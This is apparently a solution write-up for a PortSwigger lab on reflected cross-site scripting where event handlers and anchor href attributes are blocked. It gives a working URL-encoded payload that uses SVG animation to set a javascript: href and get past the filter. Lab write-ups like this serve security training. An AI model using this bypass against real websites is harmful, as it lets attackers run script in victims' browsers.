# Lab-27: [Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor ``` href ``` attributes are blocked. 

**Aim :-** To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the ``` alert ``` function. 

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example: 
```bash
<a href="">Click me</a>
```



## Solution
- Append the following payload to the website **URL** and make the request.
``` ?search=<svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(123)+%2F><text+x%3D20+y%3D20>Click me<%2Ftext><%2Fa> ```

- This payload uses SVG animation to dynamically inject a javascript: href, bypassing filters and executing JavaScript when the user clicks the SVG text.